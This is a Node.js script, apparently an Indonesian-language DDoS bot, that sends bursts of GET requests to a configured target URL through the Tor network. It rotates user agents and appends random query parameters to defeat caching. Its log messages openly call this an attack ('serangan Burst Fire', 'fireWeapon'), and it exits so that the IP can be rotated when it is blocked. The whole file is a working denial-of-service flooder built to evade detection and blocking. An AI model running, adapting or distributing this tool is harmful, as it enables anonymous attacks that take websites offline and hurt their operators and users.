const axios = require('axios');
const fs = require('fs');
const chalk = require('chalk');
const { SocksProxyAgent } = require('socks-proxy-agent');

const config = JSON.parse(fs.readFileSync('./data.json', 'utf8'));
const httpsAgent = new SocksProxyAgent('socks5h://127.0.0.1:9050');

const USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/121.0.0.0 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Chrome/120.0.0.0",
    "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0"
];

let stats = { success: 0, failed: 0, total: 0 };

// Tidak ada lagi console.clear() biar log sebelumnya tidak hilang saat rotasi
console.log(chalk.cyan.bold("\n=================================================="));
console.log(chalk.yellow("  TARGET   : ") + chalk.white(config.target_url));
console.log(chalk.yellow("  MODE     : ") + chalk.red.bold(`OP BURST FIRE (x${config.burst_power})`));
console.log(chalk.yellow("  PROXY    : ") + chalk.green("Tor Network (127.0.0.1:9050)"));
console.log(chalk.cyan.bold("=================================================="));

async function fireWeapon() {
    const reqId = Math.random().toString(36).substring(2, 8).toUpperCase();
    const fullUrl = `${config.target_url}?uuid=${reqId}`;
    const ua = USER_AGENTS[Math.floor(Math.random() * USER_AGENTS.length)];
    
    const headers = { 'User-Agent': ua, 'Cache-Control': 'no-cache' };
    stats.total++;

    try {
        const startReq = Date.now();
        const res = await axios.get(fullUrl, { headers, httpsAgent, timeout: 10000 });
        const ping = Date.now() - startReq;
        stats.success++;
        
        // Log memanjang ke bawah dengan format rapi
        console.log(
            chalk.cyan(`[${reqId}] `) + 
            chalk.bgGreen.black(` HIT `) + chalk.green(` ${res.status} `) + 
            chalk.yellow(`${ping}ms `) +
            chalk.white(`| Sukses: ${stats.success} | Gagal: ${stats.failed}`)
        );
    } catch (err) {
        stats.failed++;
        console.log(
            chalk.cyan(`[${reqId}] `) + 
            chalk.bgRed.white(` ERR `) + chalk.red(` Blokir/Timeout `) + 
            chalk.white(`| Sukses: ${stats.success} | Gagal: ${stats.failed}`)
        );
    }
}

// FUNGSI CERDAS: Cek Koneksi Domain Dulu
async function startBot() {
    console.log(chalk.yellow(`\n[*] Mengecek koneksi jaringan Tor ke domain tujuan...`));
    try {
        // Melakukan ping sekali ke server tujuan
        const check = await axios.head(config.target_url, { httpsAgent, timeout: 15000 });
        
        console.log(chalk.green(`[+] DOMAIN VALID & TERHUBUNG! (HTTP Status: ${check.status})`));
        console.log(chalk.cyan(`[*] Memulai serangan Burst Fire...\n`));
        
        // Jika terhubung, baru tembak berkali-kali
        setInterval(() => {
            for(let i = 0; i < config.burst_power; i++) {
                fireWeapon();
            }
        }, config.delay_ms);
        
    } catch (err) {
        // Jika jaringan Tor gagal atau domain salah, bot akan otomatis skip tanpa nge-blank
        console.log(chalk.red(`[-] KONEKSI GAGAL: Tidak bisa mengakses domain lewat IP ini.`));
        console.log(chalk.grey(`    Alasan: ${err.message}`));
        console.log(chalk.yellow(`[*] Menghentikan sesi ini agar sistem merotasi IP baru...\n`));
        process.exit(1); 
    }
}

startBot();
